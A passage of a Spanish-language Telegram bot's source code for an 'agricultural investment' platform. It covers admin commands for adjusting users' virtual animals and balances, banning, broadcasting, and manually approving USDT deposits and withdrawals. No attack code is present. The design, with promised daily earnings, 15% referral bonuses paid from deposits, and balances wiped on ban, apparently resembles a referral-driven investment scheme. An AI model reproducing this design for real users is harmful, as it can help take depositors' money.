        bot.sendMessage(telegramId, `⚠️ El administrador ha retirado ${quantity} pollos de tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/quithen\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'hens' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount < quantity) return bot.sendMessage(msg.chat.id, 'No hay suficientes gallinas para quitar.');
      
      db.run(`
        UPDATE animals 
        SET quantity = quantity - ? 
        WHERE user_id = ? AND type = 'hens' AND expiry_date > datetime('now')
      `, [quantity, user.id], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al quitar gallinas.');
        bot.sendMessage(msg.chat.id, `Se quitaron ${quantity} gallinas del usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `⚠️ El administrador ha retirado ${quantity} gallinas de tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/quitrooster\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'roosters' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount < quantity) return bot.sendMessage(msg.chat.id, 'No hay suficientes gallos para quitar.');
      
      db.run(`
        UPDATE animals 
        SET quantity = quantity - ? 
        WHERE user_id = ? AND type = 'roosters' AND expiry_date > datetime('now')
      `, [quantity, user.id], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al quitar gallos.');
        bot.sendMessage(msg.chat.id, `Se quitaron ${quantity} gallos del usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `⚠️ El administrador ha retirado ${quantity} gallos de tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/quitturkey\s+(\d+)\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const quantity = parseInt(match[1]);
  const telegramId = match[2];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario está baneado.');
    
    db.all(`
      SELECT SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND type = 'turkeys' AND expiry_date > datetime('now')
    `, [user.id], (err, result) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      const currentCount = result[0]?.total || 0;
      if (currentCount < quantity) return bot.sendMessage(msg.chat.id, 'No hay suficientes pavos para quitar.');
      
      db.run(`
        UPDATE animals 
        SET quantity = quantity - ? 
        WHERE user_id = ? AND type = 'turkeys' AND expiry_date > datetime('now')
      `, [quantity, user.id], (err) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error al quitar pavos.');
        bot.sendMessage(msg.chat.id, `Se quitaron ${quantity} pavos del usuario ${telegramId}.`);
        bot.sendMessage(telegramId, `⚠️ El administrador ha retirado ${quantity} pavos de tu cuenta.`);
      });
    });
  });
});

bot.onText(/\/banuser\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const telegramId = match[1];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (user.banned) return bot.sendMessage(msg.chat.id, 'El usuario ya está baneado.');
    
    db.run('UPDATE users SET banned = 1, balance = 0, daily_referral_income = 0 WHERE telegram_id = ?', [telegramId], (err) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error al banear usuario.');
      
      db.run('DELETE FROM animals WHERE user_id = ?', [user.id], (err) => {
        if (err) console.error(`[${new Date().toISOString()}] Error deleting animals: ${err.message}`);
        
        db.run('DELETE FROM referrals WHERE referrer_id = ? OR referred_id = ?', [user.id, user.id], (err) => {
          if (err) console.error(`[${new Date().toISOString()}] Error deleting referrals: ${err.message}`);
          
          db.run('DELETE FROM referral_rewards WHERE referrer_id = ?', [user.id], (err) => {
            if (err) console.error(`[${new Date().toISOString()}] Error deleting referral rewards: ${err.message}`);
            
            bot.sendMessage(msg.chat.id, `Usuario ${telegramId} ha sido baneado y todos sus datos han sido eliminados.`);
            bot.sendMessage(telegramId, `🚫 Tu cuenta ha sido baneada. Todos tus datos han sido eliminados. Contacta al soporte para más información.`);
          });
        });
      });
    });
  });
});

bot.onText(/\/unbanuser\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const telegramId = match[1];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    if (!user.banned) return bot.sendMessage(msg.chat.id, 'El usuario no está baneado.');
    
    db.run(`
      UPDATE users 
      SET banned = 0, balance = 0, daily_referral_income = 0, referred_by = NULL 
      WHERE telegram_id = ?
    `, [telegramId], (err) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error al desbanear usuario.');
      
      db.run('DELETE FROM animals WHERE user_id = ?', [user.id], (err) => {
        if (err) console.error(`[${new Date().toISOString()}] Error deleting animals: ${err.message}`);
        
        db.run('DELETE FROM referrals WHERE referrer_id = ? OR referred_id = ?', [user.id, user.id], (err) => {
          if (err) console.error(`[${new Date().toISOString()}] Error deleting referrals: ${err.message}`);
          
          db.run('DELETE FROM referral_rewards WHERE referrer_id = ?', [user.id], (err) => {
            if (err) console.error(`[${new Date().toISOString()}] Error deleting referral rewards: ${err.message}`);
            
            const newReferralCode = generateReferralCode();
            db.run('UPDATE users SET referral_code = ? WHERE telegram_id = ?', [newReferralCode, telegramId], (err) => {
              if (err) console.error(`[${new Date().toISOString()}] Error updating referral code: ${err.message}`);
              
              bot.sendMessage(msg.chat.id, `Usuario ${telegramId} ha sido desbaneado y sus datos han sido reiniciados.`);
              bot.sendMessage(telegramId, `✅ Tu cuenta ha sido desbaneada. Tus datos han sido reiniciados. ¡Bienvenido de vuelta!`);
              
              const expiryDate = new Date();
              expiryDate.setDate(expiryDate.getDate() + 28);
              db.run(`
                INSERT INTO animals (user_id, type, quantity, expiry_date)
                VALUES (?, 'eggs', 1, ?)
              `, [user.id, expiryDate.toISOString()], (err) => {
                if (err) console.error(`[${new Date().toISOString()}] Error granting egg: ${err.message}`);
              });
            });
          });
        });
      });
    });
  });
});

bot.onText(/\/info/, (msg) => {
  if (msg.from.id !== adminId) return;
  
  db.get('SELECT COUNT(*) as total_users FROM users', (err, result) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    
    db.get('SELECT COUNT(*) as active_users FROM users WHERE banned = 0', (err, activeResult) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      
      db.get('SELECT COUNT(*) as banned_users FROM users WHERE banned = 1', (err, bannedResult) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
        
        db.get(`
          SELECT SUM(amount) as total_deposits 
          FROM transactions 
          WHERE type = 'deposit' AND status = 'approved'
        `, (err, depositResult) => {
          if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
          
          const message = `📊 Información del Bot\n\n` +
                         `Total de usuarios: ${result.total_users}\n` +
                         `Usuarios activos: ${activeResult.active_users}\n` +
                         `Usuarios baneados: ${bannedResult.banned_users}\n` +
                         `Depósitos totales: $${(depositResult.total_deposits || 0).toFixed(2)} USDT`;
          bot.sendMessage(msg.chat.id, message);
        });
      });
    });
  });
});

bot.onText(/\/infousers/, (msg) => {
  if (msg.from.id !== adminId) return;
  
  db.all('SELECT * FROM users', [], (err, users) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    
    let output = 'Información de usuarios\n\n';
    let processed = 0;
    
    users.forEach(user => {
      db.all(`
        SELECT type, SUM(quantity) as total
        FROM animals 
        WHERE user_id = ? AND expiry_date > datetime('now')
        GROUP BY type
      `, [user.id], (err, animals) => {
        if (err) console.error(`[${new Date().toISOString()}] Error fetching animals: ${err.message}`);
        
        db.get('SELECT COUNT(*) as referral_count FROM referrals WHERE referrer_id = ?', [user.id], (err, referralResult) => {
          if (err) console.error(`[${new Date().toISOString()}] Error fetching referral count: ${err.message}`);
          
          db.get('SELECT SUM(earned) as referral_earnings FROM referrals WHERE referrer_id = ?', [user.id], (err, earningsResult) => {
            if (err) console.error(`[${new Date().toISOString()}] Error fetching referral earnings: ${err.message}`);
            
            const animalCounts = { eggs: 0, chickens: 0, hens: 0, roosters: 0, turkeys: 0 };
            animals.forEach(animal => animalCounts[animal.type] = animal.total);
            
            output += `Usuario: ${user.first_name} ${user.last_name}\n` +
                     `ID: ${user.telegram_id}\n` +
                     `Username: @${user.username || 'N/A'}\n` +
                     `Balance: $${user.balance.toFixed(2)}\n` +
                     `Ganancias diarias por referidos: $${user.daily_referral_income.toFixed(3)}\n` +
                     `Huevos: ${animalCounts.eggs}\n` +
                     `Pollos: ${animalCounts.chickens}\n` +
                     `Gallinas: ${animalCounts.hens}\n` +
                     `Gallos: ${animalCounts.roosters}\n` +
                     `Pavos: ${animalCounts.turkeys}\n` +
                     `Referidos: ${referralResult.referral_count}\n` +
                     `Ganancias por referidos: $${(earningsResult.referral_earnings || 0).toFixed(2)}\n` +
                     `Estado: ${user.banned ? 'Baneado' : 'Activo'}\n\n`;
            
            processed++;
            if (processed === users.length) {
              fs.writeFileSync('users_info.txt', output);
              bot.sendDocument(msg.chat.id, 'users_info.txt', {caption: 'Información de todos los usuarios.'}, {}, () => {
                fs.unlinkSync('users_info.txt');
              });
            }
          });
        });
      });
    });
  });
});

bot.onText(/\/infouse\s+(\d+)/, (msg, match) => {
  if (msg.from.id !== adminId) return;
  const telegramId = match[1];
  
  db.get('SELECT * FROM users WHERE telegram_id = ?', [telegramId], (err, user) => {
    if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    if (!user) return bot.sendMessage(msg.chat.id, 'Usuario no encontrado.');
    
    db.all(`
      SELECT type, SUM(quantity) as total
      FROM animals 
      WHERE user_id = ? AND expiry_date > datetime('now')
      GROUP BY type
    `, [user.id], (err, animals) => {
      if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
      
      db.get('SELECT COUNT(*) as referral_count FROM referrals WHERE referrer_id = ?', [user.id], (err, referralResult) => {
        if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
        
        db.get('SELECT SUM(earned) as referral_earnings FROM referrals WHERE referrer_id = ?', [user.id], (err, earningsResult) => {
          if (err) return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
          
          const animalCounts = { eggs: 0, chickens: 0, hens: 0, roosters: 0, turkeys: 0 };
          animals.forEach(animal => animalCounts[animal.type] = animal.total);
          
          const message = `📋 Información del usuario\n\n` +
                         `Usuario: ${user.first_name} ${user.last_name}\n` +
                         `ID: ${user.telegram_id}\n` +
                         `Username: @${user.username || 'N/A'}\n` +
                         `Balance: $${user.balance.toFixed(2)}\n` +
                         `Ganancias diarias por referidos: $${user.daily_referral_income.toFixed(3)}\n` +
                         `Huevos: ${animalCounts.eggs}\n` +
                         `Pollos: ${animalCounts.chickens}\n` +
                         `Gallinas: ${animalCounts.hens}\n` +
                         `Gallos: ${animalCounts.roosters}\n` +
                         `Pavos: ${animalCounts.turkeys}\n` +
                         `Referidos: ${referralResult.referral_count}\n` +
                         `Ganancias por referidos: $${(earningsResult.referral_earnings || 0).toFixed(2)}\n` +
                         `Estado: ${user.banned ? 'Baneado' : 'Activo'}`;
          bot.sendMessage(msg.chat.id, message);
        });
      });
    });
  });
});

// New broadcast command
bot.onText(/\/brodcats\s+(.+)/, async (msg, match) => {
  if (msg.from.id !== adminId) return;
  const message = match[1];
  
  console.log(`[${new Date().toISOString()}] Broadcast command received: ${message}`);
  
  db.all('SELECT telegram_id FROM users WHERE banned = 0', [], async (err, users) => {
    if (err) {
      console.error(`[${new Date().toISOString()}] Error fetching users for broadcast: ${err.message}`);
      return bot.sendMessage(msg.chat.id, 'Error en la base de datos.');
    }
    
    if (users.length === 0) {
      console.log(`[${new Date().toISOString()}] No active users found for broadcast`);
      return bot.sendMessage(msg.chat.id, 'No hay usuarios activos para enviar el mensaje.');
    }
    
    let successCount = 0;
    let failCount = 0;
    
    for (const user of users) {
      try {
        await bot.sendMessage(user.telegram_id, message);
        successCount++;
        console.log(`[${new Date().toISOString()}] Broadcast sent to ${user.telegram_id}`);
      } catch (error) {
        console.error(`[${new Date().toISOString()}] Error sending broadcast to ${user.telegram_id}: ${error.message}`);
        failCount++;
      }
    }
    
    const resultMessage = `📢 Transmisión completada\n\n` +
                         `Mensajes enviados: ${successCount}\n` +
                         `Mensajes fallidos: ${failCount}`;
    bot.sendMessage(msg.chat.id, resultMessage);
    console.log(`[${new Date().toISOString()}] Broadcast completed: ${successCount} sent, ${failCount} failed`);
  });
});

bot.onText(/\/adminhelp/, (msg) => {
  if (msg.from.id !== adminId) return;
  
  const helpMessage = `📚 Comandos de Administrador\n\n` +
                     `/addbalance <cantidad> <telegramId>\n` +
                     `Ejemplo: /addbalance 6 6133901913\n` +
                     `Añade la cantidad especificada al balance del usuario.\n\n` +
                     `/quitbalance <cantidad> <telegramId>\n` +
                     `Ejemplo: /quitbalance 6 6133901913\n` +
                     `Quita la cantidad especificada del balance del usuario.\n\n` +
                     `/addegg <cantidad> <telegramId>\n` +
                     `Ejemplo: /addegg 2 6133901913\n` +
                     `Añade la cantidad especificada de huevos al usuario.\n\n` +
                     `/addchicken <cantidad> <telegramId>\n` +
                     `Ejemplo: /addchicken 2 6133901913\n` +
                     `Añade la cantidad especificada de pollos al usuario.\n\n` +
                     `/addhen <cantidad> <telegramId>\n` +
                     `Ejemplo: /addhen 2 6133901913\n` +
                     `Añade la cantidad especificada de gallinas al usuario.\n\n` +
                     `/addrooster <cantidad> <telegramId>\n` +
                     `Ejemplo: /addrooster 2 6133901913\n` +
                     `Añade la cantidad especificada de gallos al usuario.\n\n` +
                     `/addturkey <cantidad> <telegramId>\n` +
                     `Ejemplo: /addturkey 2 6133901913\n` +
                     `Añade la cantidad especificada de pavos al usuario.\n\n` +
                     `/quitegg <cantidad> <telegramId>\n` +
                     `Ejemplo: /quitegg 2 6133901913\n` +
                     `Quita la cantidad especificada de huevos del usuario.\n\n` +
                     `/quitchicken <cantidad> <telegramId>\n` +
                     `Ejemplo: /quitchicken 2 6133901913\n` +
                     `Quita la cantidad especificada de pollos del usuario.\n\n` +
                     `/quithen <cantidad> <telegramId>\n` +
                     `Ejemplo: /quithen 2 6133901913\n` +
                     `Quita la cantidad especificada de gallinas del usuario.\n\n` +
                     `/quitrooster <cantidad> <telegramId>\n` +
                     `Ejemplo: /quitrooster 2 6133901913\n` +
                     `Quita la cantidad especificada de gallos del usuario.\n\n` +
                     `/quitturkey <cantidad> <telegramId>\n` +
                     `Ejemplo: /quitturkey 2 6133901913\n` +
                     `Quita la cantidad especificada de pavos del usuario.\n\n` +
                     `/banuser <telegramId>\n` +
                     `Ejemplo: /banuser 6133901913\n` +
                     `Banea al usuario y elimina todos sus datos.\n\n` +
                     `/unbanuser <telegramId>\n` +
                     `Ejemplo: /unbanuser 6133901913\n` +
                     `Desbanea al usuario y reinicia sus datos.\n\n` +
                     `/info\n` +
                     `Muestra estadísticas generales del bot.\n\n` +
                     `/infousers\n` +
                     `Envía un archivo .txt con la información de todos los usuarios.\n\n` +
                     `/infouse <telegramId>\n` +
                     `Ejemplo: /infouse 6133901913\n` +
                     `Muestra la información detallada de un usuario específico.\n\n` +
                     `/brodcats <mensaje>\n` +
                     `Ejemplo: /brodcats Hola a todos\n` +
                     `Envía un mensaje a todos los usuarios activos.\n\n` +
                     `/adminhelp\n` +
                     `Muestra esta lista de comandos de administrador.`;
  bot.sendMessage(msg.chat.id, helpMessage);
});

// Manejar callbacks para aprobar/rechazar transacciones
bot.on('callback_query', (callbackQuery) => {
  const data = callbackQuery.data;
  const transactionId = data.split('_')[2];
  const action = data.split('_')[0];
  
  if (data.startsWith('approve_deposit') || data.startsWith('reject_deposit')) {
    handleDepositAction(bot, callbackQuery, transactionId, action);
  } else if (data.startsWith('approve_withdrawal') || data.startsWith('reject_withdrawal')) {
    handleWithdrawalAction(bot, callbackQuery, transactionId, action);
  }
});

function handleDepositAction(bot, callbackQuery, transactionId, action) {
  const status = action === 'approve' ? 'approved' : 'rejected';
  
  db.get('SELECT * FROM transactions WHERE id = ?', [transactionId], (err, transaction) => {
    if (err) {
      console.error(`[${new Date().toISOString()}] Error fetching transaction: ${err.message}`);
      return bot.answerCallbackQuery(callbackQuery.id, {text: 'Error al procesar la transacción'});
    }
    if (!transaction) {
      return bot.answerCallbackQuery(callbackQuery.id, {text: 'Transacción no encontrada'});
    }
    if (transaction.status !== 'pending') {
      return bot.answerCallbackQuery(callbackQuery.id, {text: 'La transacción ya fue procesada'});
    }
    
    db.get('SELECT * FROM users WHERE id = ?', [transaction.user_id], (err, user) => {
      if (err) {
        console.error(`[${new Date().toISOString()}] Error fetching user: ${err.message}`);
        return bot.answerCallbackQuery(callbackQuery.id, {text: 'Error al encontrar usuario'});
      }
      if (user.banned) {
        return bot.answerCallbackQuery(callbackQuery.id, {text: 'El usuario está baneado'});
      }
      
      db.run('UPDATE transactions SET status = ? WHERE id = ?', [status, transactionId], (err) => {
        if (err) {
          console.error(`[${new Date().toISOString()}] Error updating transaction: ${err.message}`);
          return bot.answerCallbackQuery(callbackQuery.id, {text: 'Error al actualizar transacción'});
        }
        
        if (status === 'approved') {
          db.run('UPDATE users SET balance = balance + ? WHERE id = ?', [transaction.amount, user.id], (err) => {
            if (err) console.error(`[${new Date().toISOString()}] Error updating balance: ${err.message}`);
            
            if (user.referred_by) {
              const referralBonus = transaction.amount * 0.15;
              db.run('UPDATE users SET balance = balance + ? WHERE id = ?', [referralBonus, user.referred_by], (err) => {
                if (err) console.error(`[${new Date().toISOString()}] Error updating referrer balance: ${err.message}`);
                db.run(`
                  UPDATE referrals SET earned = earned + ? 
                  WHERE referrer_id = ? AND referred_id = ?
                `, [referralBonus, user.referred_by, user.id], (err) => {
                  if (err) console.error(`[${new Date().toISOString()}] Error updating referral earnings: ${err.message}`);
                });
              });
            }
            
            bot.sendMessage(user.telegram_id, `✅ Tu depósito de ${transaction.amount} USDT ha sido aprobado. Tu balance ha sido actualizado.`);
          });
        } else {
          bot.sendMessage(user.telegram_id, `❌ Tu depósito de ${transaction.amount} USDT ha sido rechazado. Por favor, contacta al soporte si crees que esto es un error.`);
        }
        
        const newText = callbackQuery.message.text + `\n\nEstado: ${status === 'approved' ? '✅ Aprobado' : '❌ Rechazado'}`;
        bot.editMessageText(newText, {
          chat_id: callbackQuery.message.chat.id,
          message_id: callbackQuery.message.message_id,
          reply_markup: {inline_keyboard: []}
        });
        
        bot.answerCallbackQuery(callbackQuery.id, {text: `Depósito ${status}`});
      });
    });
  });
}

function handleWithdrawalAction(bot, callbackQuery, transactionId, action) {
  const status = action === 'approve' ? 'approved' : 'rejected';
  
  db.get('SELECT * FROM transactions WHERE id = ?', [transactionId], (err, transaction) => {
    if (err) {
      console.error(`[${new Date().toISOString()}] Error fetching transaction: ${err.message}`);
      return bot.answerCallbackQuery(callbackQuery.id, {text: 'Error al procesar la transacción'});
    }
    if (!transaction) {
      return bot.answerCallbackQuery(callbackQuery.id, {text: 'Transacción no encontrada'});
    }
    if (transaction.status !== 'pending') {
      return bot.answerCallbackQuery(callbackQuery.id, {text: 'La transacción ya fue procesada'});
    }
    
    db.get('SELECT * FROM users WHERE id = ?', [transaction.user_id], (err, user) => {
      if (err) {
        console.error(`[${new Date().toISOString()}] Error fetching user: ${err.message}`);
        return bot.answerCallbackQuery(callbackQuery.id, {text: 'Error al encontrar usuario'});
      }
      if (user.banned) {
        return bot.answerCallbackQuery(callbackQuery.id, {text: 'El usuario está baneado'});
      }
      
      db.run('UPDATE transactions SET status = ? WHERE id = ?', [status, transactionId], (err) => {
        if (err) {
          console.error(`[${new Date().toISOString()}] Error updating transaction: ${err.message}`);
          return bot.answerCallbackQuery(callbackQuery.id, {text: 'Error al actualizar transacción'});
        }
        
        if (status === 'rejected') {
          db.run('UPDATE users SET balance = balance + ? WHERE id = ?', [transaction.amount, user.id], (err) => {
            if (err) console.error(`[${new Date().toISOString()}] Error updating balance: ${err.message}`);
          });
        }
        
        if (status === 'approved') {
          bot.sendMessage(user.telegram_id, `✅ Tu retiro de ${transaction.amount} USDT ha sido aprobado. Los fondos serán enviados a tu wallet ${transaction.wallet_address} en la red ${transaction.network}.`);
        } else {
          bot.sendMessage(user.telegram_id, `❌ Tu retiro de ${transaction.amount} USDT ha sido rechazado. Los fondos han sido devueltos a tu balance. Por favor, contacta al soporte si crees que esto es un error.`);
        }
        
        const newText = callbackQuery.message.text + `\n\nEstado: ${status === 'approved' ? '✅ Aprobado' : '❌ Rechazado'}`;
        bot.editMessageText(newText, {
          chat_id: callbackQuery.message.chat.id,
          message_id: callbackQuery.message.message_id,
          reply_markup: {inline_keyboard: []}
        });
        
        bot.answerCallbackQuery(callbackQuery.id, {text: `Retiro ${status}`});
      });
    });
  });
}

function generateReferralCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function sendWelcomeMessage(chatId, firstName, userId) {
  const webAppUrl = `${process.env.WEB_APP_URL}?startapp=${userId}`;
  bot.sendMessage(chatId, `¡Bienvenido, ${firstName}! 🎉\n\n` +
                         `Gracias por unirte a Inversiones Agrícolas. ` +
                         `Aquí podrás invertir en animales y obtener ganancias diarias. ` +
                         `Haz clic en el botón de abajo para comenzar:`, {
    reply_markup: {
      inline_keyboard: [[{ text: 'Abrir Aplicación', web_app: { url: webAppUrl } }]],
    },
  });
}

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});